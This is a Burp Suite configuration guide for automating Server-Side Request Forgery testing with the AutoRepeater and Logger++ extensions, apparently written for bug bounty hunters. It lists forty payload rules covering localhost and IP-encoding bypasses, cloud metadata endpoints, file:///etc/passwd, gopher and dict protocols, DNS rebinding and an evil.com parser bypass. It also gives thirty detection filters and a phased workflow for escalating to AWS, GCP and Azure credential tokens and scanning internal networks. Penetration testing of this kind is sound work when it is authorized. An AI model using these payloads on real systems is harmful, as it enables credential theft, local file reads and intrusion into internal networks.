## Server Side Request Forgery Automation in Burp Suite
#### <em>Extentions: AutoRepeater</em>

## 🎯 Overview

This framework provides **complete Server-Side Request Forgery (SSRF) detection and exploitation** using only two Burp Suite extensions:
- **AutoRepeater**: Automatically injects SSRF payloads into URL parameters
- **Logger++**: Filters responses to identify successful SSRF attempts

**Covers 40+ bypass techniques including: Localhost bypasses, IP encoding, DNS rebinding, Protocol exploitation, Cloud metadata access, and Internal network scanning.**

---

## 💡 Why This Framework?

Most bug hunters miss SSRF vulnerabilities because they:
- ✗ Only test basic `http://localhost` and `http://127.0.0.1`
- ✗ Skip IP encoding bypasses (decimal, octal, hex)
- ✗ Don't test IPv6 variations
- ✗ Ignore DNS rebinding techniques
- ✗ Miss cloud metadata endpoints (AWS, GCP, Azure)
- ✗ Don't test different protocols (gopher://, file://, dict://)
- ✗ Skip URL parser confusion attacks
- ✗ Don't attempt localhost bypass via domains (localtest.me, nip.io)
- ✗ Miss SSRF in non-obvious parameters (Referer, User-Agent, etc.)

**This framework tests 40+ different SSRF techniques simultaneously across all URL parameters.**

---

## ⚙️ Requirements

### Burp Suite Extensions
1. **AutoRepeater** - [Download from BApp Store](https://portswigger.net/bappstore/f89f2837c22c4ab4b772f31522647ed8)
2. **Logger++** - [Download from BApp Store](https://portswigger.net/bappstore/470b7057b86f41c396a97903377f3d81)

### External Requirements
1. **Out-of-Band Server** (choose one):
   - Burp Collaborator (built-in)
   - [Interactsh](https://app.interactsh.com/)
   - [webhook.site](https://webhook.site/)
   - [pingb.in](http://pingb.in/)
   - Your own server with logs

### Target Indicators (High Success)
```
✓ Applications that fetch URLs (fetching images, webhooks, RSS feeds)
✓ Parameters like: url, uri, path, dest, redirect, link, target, rurl, domain, callback
✓ Document generators (PDF, image converters)
✓ Cloud-hosted applications (AWS, GCP, Azure)
✓ APIs that perform HTTP requests
✓ Proxy/gateway functionality
```

---

## 🔧 AutoRepeater Configuration

### Setup Instructions
1. Open Burp Suite → Extensions → AutoRepeater
2. Create 40 replacement rules (tabs)
3. **IMPORTANT**: Replace `YOUR-OOB-SERVER.com` with your actual Out-of-Band server
4. Enable all tabs before testing

---

### **Tab 1: Basic Localhost (HTTP)**
```
Type: Request Parameter Value
Match: ^https?://.*
Replace: http://localhost
Which: Replace All
Regex Match: Enabled
Comment: Basic localhost access - port 80
```

    ```
    Type: Request String
    Match: (https?:\/\/(?:www\.|(?!www))[a-zA-Z0-9][a-zA-Z0-9-]+[a-zA-Z0-9]\.[^\s]{2,}|www\.[a-zA-Z0-9][a-zA-Z0-9-]+[a-zA-Z0-9]\.[^\s]{2,}|https?:\/\/(?:www\.|(?!www))[a-zA-Z0-9]+\.[^\s]{2,}|www\.[a-zA-Z0-9]+\.[^\s]{2,})
    Replace: https://<Your-OoB-Server>
    Which: Replace All
    Regex Match: Enabled
    ```

---

### **Tab 2: Localhost with Common Ports**
```
Type: Request Parameter Value
Match: ^https?://.*
Replace: http://localhost:22
Which: Replace All
Regex Match: Enabled
Comment: SSH port scan via SSRF
```

---

### **Tab 3: 127.0.0.1 Standard**
```
Type: Request Parameter Value
Match: ^https?://.*
Replace: http://127.0.0.1
Which: Replace All
Regex Match: Enabled
Comment: Loopback IP address
```

---

### **Tab 4: 0.0.0.0 (All Interfaces)**
```
Type: Request Parameter Value
Match: ^https?://.*
Replace: http://0.0.0.0
Which: Replace All
Regex Match: Enabled
Comment: Bind to all interfaces - Linux/Mac localhost bypass
```

---

### **Tab 5: IPv6 Loopback**
```
Type: Request Parameter Value
Match: ^https?://.*
Replace: http://[::1]
Which: Replace All
Regex Match: Enabled
Comment: IPv6 localhost notation
```

---

### **Tab 6: IPv6 Unspecified Address**
```
Type: Request Parameter Value
Match: ^https?://.*
Replace: http://[::]
Which: Replace All
Regex Match: Enabled
Comment: IPv6 unspecified address
```

---

### **Tab 7: IPv4-Mapped IPv6**
```
Type: Request Parameter Value
Match: ^https?://.*
Replace: http://[::ffff:127.0.0.1]
Which: Replace All
Regex Match: Enabled
Comment: IPv4-mapped IPv6 address
```

---

### **Tab 8: Localhost via Domain (localtest.me)**
```
Type: Request Parameter Value
Match: ^https?://.*
Replace: http://localtest.me
Which: Replace All
Regex Match: Enabled
Comment: Resolves to ::1 (localhost)
```

---

### **Tab 9: Localhost via Domain (localh.st)**
```
Type: Request Parameter Value
Match: ^https?://.*
Replace: http://localh.st
Which: Replace All
Regex Match: Enabled
Comment: Resolves to 127.0.0.1
```

---

### **Tab 10: NIP.IO Localhost**
```
Type: Request Parameter Value
Match: ^https?://.*
Replace: http://127.0.0.1.nip.io
Which: Replace All
Regex Match: Enabled
Comment: NIP.IO DNS service - resolves to 127.0.0.1
```

---

### **Tab 11: CIDR Range (127.x.x.x)**
```
Type: Request Parameter Value
Match: ^https?://.*
Replace: http://127.127.127.127
Which: Replace All
Regex Match: Enabled
Comment: Alternative loopback address in 127.0.0.0/8 range
```

---

### **Tab 12: Short-hand IP (127.1)**
```
Type: Request Parameter Value
Match: ^https?://.*
Replace: http://127.1
Which: Replace All
Regex Match: Enabled
Comment: Compressed IP notation = 127.0.0.1
```

---

### **Tab 13: Decimal IP (Localhost)**
```
Type: Request Parameter Value
Match: ^https?://.*
Replace: http://2130706433
Which: Replace All
Regex Match: Enabled
Comment: Decimal representation of 127.0.0.1
```

---

### **Tab 14: Octal IP (Localhost)**
```
Type: Request Parameter Value
Match: ^https?://.*
Replace: http://0177.0.0.1
Which: Replace All
Regex Match: Enabled
Comment: Octal IP encoding
```

---

### **Tab 15: Hex IP (Localhost)**
```
Type: Request Parameter Value
Match: ^https?://.*
Replace: http://0x7f000001
Which: Replace All
Regex Match: Enabled
Comment: Hexadecimal IP encoding
```

---

### **Tab 16: AWS Metadata (IMDSv1)**
```
Type: Request Parameter Value
Match: ^https?://.*
Replace: http://169.254.169.254/latest/meta-data/
Which: Replace All
Regex Match: Enabled
Comment: AWS EC2 metadata service - critical for cloud exploitation
```

---

### **Tab 17: AWS Metadata Decimal**
```
Type: Request Parameter Value
Match: ^https?://.*
Replace: http://2852039166/latest/meta-data/
Which: Replace All
Regex Match: Enabled
Comment: AWS metadata via decimal IP encoding
```

---

### **Tab 18: GCP Metadata**
```
Type: Request Parameter Value
Match: ^https?://.*
Replace: http://metadata.google.internal/computeMetadata/v1/
Which: Replace All
Regex Match: Enabled
Comment: Google Cloud Platform metadata
```

---

### **Tab 19: GCP Metadata (IP)**
```
Type: Request Parameter Value
Match: ^https?://.*
Replace: http://169.254.169.254/computeMetadata/v1/
Which: Replace All
Regex Match: Enabled
Comment: GCP metadata via direct IP
```

---

### **Tab 20: Azure Metadata**
```
Type: Request Parameter Value
Match: ^https?://.*
Replace: http://169.254.169.254/metadata/instance?api-version=2021-02-01
Which: Replace All
Regex Match: Enabled
Comment: Azure Instance Metadata Service
```

---

### **Tab 21: Out-of-Band Callback**
```
Type: Request Parameter Value
Match: ^https?://.*
Replace: http://YOUR-OOB-SERVER.com
Which: Replace All
Regex Match: Enabled
Comment: Detect blind SSRF via DNS/HTTP callback
```

---

### **Tab 22: Internal Network Scan (192.168.1.1)**
```
Type: Request Parameter Value
Match: ^https?://.*
Replace: http://192.168.1.1
Which: Replace All
Regex Match: Enabled
Comment: Common internal router IP
```

---

### **Tab 23: Internal Network Scan (10.0.0.1)**
```
Type: Request Parameter Value
Match: ^https?://.*
Replace: http://10.0.0.1
Which: Replace All
Regex Match: Enabled
Comment: Private network range
```

---

### **Tab 24: Internal Network Scan (172.16.0.1)**
```
Type: Request Parameter Value
Match: ^https?://.*
Replace: http://172.16.0.1
Which: Replace All
Regex Match: Enabled
Comment: Private network range (172.16.0.0/12)
```

---

### **Tab 25: File Protocol**
```
Type: Request Parameter Value
Match: ^https?://.*
Replace: file:///etc/passwd
Which: Replace All
Regex Match: Enabled
Comment: File protocol - read local files
```

---

### **Tab 26: Dict Protocol**
```
Type: Request Parameter Value
Match: ^https?://.*
Replace: dict://127.0.0.1:11211/stats
Which: Replace All
Regex Match: Enabled
Comment: Dict protocol - interact with services
```

---

### **Tab 27: Gopher Protocol**
```
Type: Request Parameter Value
Match: ^https?://.*
Replace: gopher://127.0.0.1:25/_HELO%20test
Which: Replace All
Regex Match: Enabled
Comment: Gopher protocol - send arbitrary TCP data
```

---

### **Tab 28: SFTP Protocol**
```
Type: Request Parameter Value
Match: ^https?://.*
Replace: sftp://127.0.0.1:22/
Which: Replace All
Regex Match: Enabled
Comment: SFTP protocol test
```

---

### **Tab 29: LDAP Protocol**
```
Type: Request Parameter Value
Match: ^https?://.*
Replace: ldap://127.0.0.1:389/dc=example,dc=com
Which: Replace All
Regex Match: Enabled
Comment: LDAP protocol exploitation
```

---

### **Tab 30: TFTP Protocol**
```
Type: Request Parameter Value
Match: ^https?://.*
Replace: tftp://127.0.0.1:69/test
Which: Replace All
Regex Match: Enabled
Comment: Trivial FTP over UDP
```

---

### **Tab 31: URL Parser Confusion (@ symbol)**
```
Type: Request Parameter Value
Match: ^https?://.*
Replace: http://127.1.1.1:80@127.2.2.2:80/
Which: Replace All
Regex Match: Enabled
Comment: URL parsing discrepancy attack
```

---

### **Tab 32: URL Parser Confusion (Backslash)**
```
Type: Request Parameter Value
Match: ^https?://.*
Replace: http://127.1.1.1:80\@127.2.2.2:80/
Which: Replace All
Regex Match: Enabled
Comment: Backslash URL parser bypass
```

---

### **Tab 33: URL Encoding Bypass**
```
Type: Request Parameter Value
Match: ^https?://.*
Replace: http://127.0.0.1/%61dmin
Which: Replace All
Regex Match: Enabled
Comment: URL encoding to bypass filters
```

---

### **Tab 34: Double URL Encoding**
```
Type: Request Parameter Value
Match: ^https?://.*
Replace: http://127.0.0.1/%252fadmin
Which: Replace All
Regex Match: Enabled
Comment: Double encoding bypass
```

---

### **Tab 35: Enclosed Alphanumerics (Unicode)**
```
Type: Request Parameter Value
Match: ^https?://.*
Replace: http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ
Which: Replace All
Regex Match: Enabled
Comment: Unicode character bypass
```

---

### **Tab 36: DNS Rebinding Domain (1u.ms)**
```
Type: Request Parameter Value
Match: ^https?://.*
Replace: http://make-YOUR-IP-rebind-169.254-169.254-rr.1u.ms
Which: Replace All
Regex Match: Enabled
Comment: DNS rebinding attack
```

---

### **Tab 37: Redirect Service (HTTP 307)**
```
Type: Request Parameter Value
Match: ^https?://.*
Replace: https://307.r3dir.me/--to/?url=http://localhost
Which: Replace All
Regex Match: Enabled
Comment: Bypass via redirect service
```

---

### **Tab 38: JAR Protocol**
```
Type: Request Parameter Value
Match: ^https?://.*
Replace: jar:http://127.0.0.1!/
Which: Replace All
Regex Match: Enabled
Comment: JAR protocol (Java) - blind SSRF
```

---

### **Tab 39: PHP filter_var() Bypass**
```
Type: Request Parameter Value
Match: ^https?://.*
Replace: 0://evil.com:80;http://google.com:80/
Which: Replace All
Regex Match: Enabled
Comment: PHP filter_var() URL validation bypass
```

---

### **Tab 40: Netdoc Protocol (Java)**
```
Type: Request Parameter Value
Match: ^https?://.*
Replace: netdoc:///etc/passwd
Which: Replace All
Regex Match: Enabled
Comment: Java Netdoc wrapper
```

---

## 🔍 Logger++ Filters

### Setup Instructions
1. Open Burp Suite → Extensions → Logger++
2. Add each filter below
3. Enable filters while testing
4. Sort by filter to find successful SSRF attempts

---

### **Filter 1: Out-of-Band Callback Detection (DNS)**
```
Request.URL CONTAINS "YOUR-OOB-SERVER.com"
```
**Purpose:** Detect blind SSRF via DNS lookup - check OOB server for hits

---

### **Filter 2: AWS Metadata Success**
```
Response.Body CONTAINS "ami-id"
OR Response.Body CONTAINS "instance-id"
OR Response.Body CONTAINS "iam/security-credentials"
```
**Purpose:** AWS EC2 metadata successfully accessed

---

### **Filter 3: GCP Metadata Success**
```
Response.Body CONTAINS "project-id"
OR Response.Body CONTAINS "instance/id"
OR Response.Body CONTAINS "service-accounts"
```
**Purpose:** Google Cloud metadata successfully accessed

---

### **Filter 4: Azure Metadata Success**
```
Response.Body CONTAINS "compute"
OR Response.Body CONTAINS "azEnvironment"
OR Response.Body CONTAINS "subscriptionId"
```
**Purpose:** Azure Instance Metadata Service accessed

---

### **Filter 5: Localhost Access Success**
```
(Request.URL CONTAINS "localhost" OR Request.URL CONTAINS "127.0.0.1")
AND Response.Status == "200"
AND Response.Length > 100
```
**Purpose:** Successful localhost connection

---

### **Filter 6: Internal IP Access**
```
(Request.URL CONTAINS "192.168" OR Request.URL CONTAINS "10.0" OR Request.URL CONTAINS "172.16")
AND Response.Status == "200"
```
**Purpose:** Internal network access successful

---

### **Filter 7: File Protocol Success**
```
Request.URL CONTAINS "file://"
AND (Response.Body CONTAINS "root:x:" OR Response.Body CONTAINS "[boot loader]")
```
**Purpose:** File protocol enabled - local file read

---

### **Filter 8: Dict Protocol Success**
```
Request.URL CONTAINS "dict://"
AND Response.Status == "200"
```
**Purpose:** Dict protocol exploitation

---

### **Filter 9: Gopher Protocol Success**
```
Request.URL CONTAINS "gopher://"
AND Response.Status == "200"
```
**Purpose:** Gopher protocol - can send arbitrary TCP data

---

### **Filter 10: LDAP Protocol Success**
```
Request.URL CONTAINS "ldap://"
AND Response.Status == "200"
```
**Purpose:** LDAP protocol exploitation

---

### **Filter 11: IPv6 Localhost Success**
```
(Request.URL CONTAINS "[::1]" OR Request.URL CONTAINS "[::]")
AND Response.Status == "200"
```
**Purpose:** IPv6 localhost bypass worked

---

### **Filter 12: Decimal/Octal/Hex IP Success**
```
(Request.URL CONTAINS "2130706433" 
 OR Request.URL CONTAINS "0177.0.0.1"
 OR Request.URL CONTAINS "0x7f000001")
AND Response.Status == "200"
```
**Purpose:** IP encoding bypass successful

---

### **Filter 13: DNS Rebinding Domain Used**
```
Request.URL CONTAINS "1u.ms"
OR Request.URL CONTAINS "rebind"
```
**Purpose:** DNS rebinding attack attempted

---

### **Filter 14: Redirect Service Used**
```
Request.URL CONTAINS "r3dir.me"
OR Response.Status >= "300"
AND Response.Status < "400"
```
**Purpose:** Redirect-based SSRF bypass

---

### **Filter 15: URL Parser Confusion**
```
Request.URL CONTAINS "@"
OR Request.URL CONTAINS "\@"
OR Request.URL CONTAINS "#"
```
**Purpose:** URL parsing discrepancy exploitation

---

### **Filter 16: Port Scanning Success**
```
(Request.URL CONTAINS ":22" OR Request.URL CONTAINS ":80" 
 OR Request.URL CONTAINS ":443" OR Request.URL CONTAINS ":3306"
 OR Request.URL CONTAINS ":6379" OR Request.URL CONTAINS ":27017")
AND Response.Status == "200"
```
**Purpose:** Port scanning via SSRF - service discovery

---

### **Filter 17: Time-Based Blind SSRF**
```
Response.Time > 5000
AND (Request.URL CONTAINS "localhost" OR Request.URL CONTAINS "127.0.0.1")
```
**Purpose:** Detect SSRF via response timing (5+ seconds)

---

### **Filter 18: Error Messages Revealing SSRF**
```
Response.Body CONTAINS "Connection refused"
OR Response.Body CONTAINS "Connection timed out"
OR Response.Body CONTAINS "No route to host"
OR Response.Body CONTAINS "Network is unreachable"
```
**Purpose:** Error messages confirm SSRF attempt

---

### **Filter 19: Cloud Credentials Exposed**
```
Response.Body CONTAINS "AWS_ACCESS_KEY"
OR Response.Body CONTAINS "AWS_SECRET"
OR Response.Body CONTAINS "private_key"
OR Response.Body CONTAINS "credentials"
```
**Purpose:** Cloud credentials leaked via metadata

---

### **Filter 20: Redis/Memcached Access**
```
(Request.URL CONTAINS ":6379" OR Request.URL CONTAINS ":11211")
AND Response.Status == "200"
```
**Purpose:** NoSQL database access via SSRF

---

### **Filter 21: Elasticsearch Access**
```
Request.URL CONTAINS ":9200"
AND Response.Body CONTAINS "cluster_name"
```
**Purpose:** Elasticsearch exposed via SSRF

---

### **Filter 22: Docker API Access**
```
Request.URL CONTAINS "/var/run/docker.sock"
OR (Request.URL CONTAINS ":2375" OR Request.URL CONTAINS ":2376")
AND Response.Status == "200"
```
**Purpose:** Docker socket/API exposed

---

### **Filter 23: Kubernetes API Access**
```
Request.URL CONTAINS ":6443"
OR Request.URL CONTAINS ":8080"
OR Request.URL CONTAINS "/api/v1"
AND Response.Status == "200"
```
**Purpose:** Kubernetes API exposed

---

### **Filter 24: Jenkins API Access**
```
Request.URL CONTAINS ":8080/jenkins"
OR Response.Body CONTAINS "Jenkins"
```
**Purpose:** Jenkins CI/CD exposed

---

### **Filter 25: Sensitive Parameters with URLs**
```
(Request.URL CONTAINS "url=" 
 OR Request.URL CONTAINS "uri="
 OR Request.URL CONTAINS "path="
 OR Request.URL CONTAINS "dest="
 OR Request.URL CONTAINS "redirect="
 OR Request.URL CONTAINS "link="
 OR Request.URL CONTAINS "target="
 OR Request.URL CONTAINS "callback="
 OR Request.URL CONTAINS "webhook=")
AND Response.Status == "200"
```
**Purpose:** Focus on parameters commonly vulnerable to SSRF

---

### **Filter 26: SSRF in Referer Header**
```
Request.Headers CONTAINS "Referer: http://localhost"
OR Request.Headers CONTAINS "Referer: http://127.0.0.1"
OR Request.Headers CONTAINS "Referer: http://YOUR-OOB-SERVER"
```
**Purpose:** SSRF via Referer header (analytics software)

---

### **Filter 27: SSRF in User-Agent**
```
Request.Headers CONTAINS "User-Agent: http://"
```
**Purpose:** SSRF via User-Agent header

---

### **Filter 28: SSRF in Custom Headers**
```
Request.Headers CONTAINS "X-Forwarded-For: http://"
OR Request.Headers CONTAINS "X-Original-URL: http://"
OR Request.Headers CONTAINS "X-Rewrite-URL: http://"
```
**Purpose:** SSRF in custom HTTP headers

---

### **Filter 29: Combined - Cloud Metadata Success**
```
(Request.URL CONTAINS "169.254.169.254" OR Request.URL CONTAINS "metadata")
AND (Response.Body CONTAINS "ami-id" 
     OR Response.Body CONTAINS "project-id"
     OR Response.Body CONTAINS "subscriptionId"
     OR Response.Body CONTAINS "credentials")
```
**Purpose:** Any cloud metadata access

---

### **Filter 30: Combined - Critical SSRF Indicators**
```
(Request.URL CONTAINS "localhost" 
 OR Request.URL CONTAINS "127.0.0.1"
 OR Request.URL CONTAINS "169.254.169.254"
 OR Request.URL CONTAINS "YOUR-OOB-SERVER")
AND Response.Status == "200"
AND Response.Length > 50
```
**Purpose:** Catch all major SSRF successes

---

## 🚀 Workflow

### **Phase 1: Initial Detection (15 minutes)**
1. Set up Out-of-Band server (Burp Collaborator or Interactsh)
2. Replace `YOUR-OOB-SERVER.com` in Tab 21 and filters
3. Enable ALL 40 AutoRepeater tabs
4. Browse target application thoroughly
5. Test all URL-accepting features:
   - Profile picture upload (URL)
   - Webhook configuration
   - RSS feed import
   - PDF/document generators
   - Image fetching features
   - Proxy/gateway functionality
6. Apply Logger++ Filter #30 (catches everything)
7. Check Out-of-Band server for DNS/HTTP hits

### **Phase 2: Cloud Metadata Exploitation (20 minutes)**
If running on cloud (AWS/GCP/Azure):
1. Apply Logger++ Filters #2, #3, #4 (cloud metadata)
2. Look for successful metadata access
3. If found, escalate to credentials:
```
   AWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/[role-name]
   GCP: http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
   Azure: http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

### **Phase 3: Internal Network Scanning (30 minutes)**
1. Apply Logger++ Filter #6 (internal IPs)
2. If internal access works, enumerate:
   - Common services (Redis:6379, MySQL:3306, MongoDB:27017)
   - Docker API (:2375)
   - Kubernetes API (:6443, :8080)
   - Jenkins (:8080)
   - Elasticsearch (:9200)
3. Use Burp Intruder to scan port ranges

### **Phase 4: Protocol Exploitation (20 minutes)**
1. Test file:// protocol (Tab 25 + Filter #7)
2. Test gopher:// for RCE (Tab 27 + Filter #9)
3. Test dict:// for service interaction (Tab 26 + Filter #8)

### **Phase 5: Advanced Bypass Testing (15 minutes)**
1. Test IP encoding (Tabs 13-15 + Filter #12)
2. Test IPv6 (Tabs 5-7 + Filter #11)
3. Test URL parser confusion (Tabs 31-32 + Filter #15)
4. Test DNS rebinding (Tab 36 + Filter #13)

### **Phase 6: Exploitation & PoC (30 minutes)**
1. Document all successful SSRF vectors
2. Create working exploit/PoC
3. Demonstrate impact (credentials, RCE, data exfiltration)
4. Prepare bug bounty report

